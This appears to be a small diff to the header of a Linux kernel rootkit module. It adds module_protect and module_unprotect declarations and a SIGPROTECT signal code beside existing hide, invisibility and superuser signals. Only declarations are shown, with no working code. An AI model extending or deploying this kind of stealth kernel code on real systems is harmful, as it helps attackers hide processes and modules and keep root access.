@@ -16,6 +16,12 @@ void
 module_show(void);
 
 void
+module_protect(void);
+
+void
+module_unprotect(void);
+
+void
 module_hide(void);
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -42,6 +48,7 @@ enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
 	SIGMODINVIS = 63,
+	SIGPROTECT = 62,
 };
 
 #ifndef IS_ENABLED
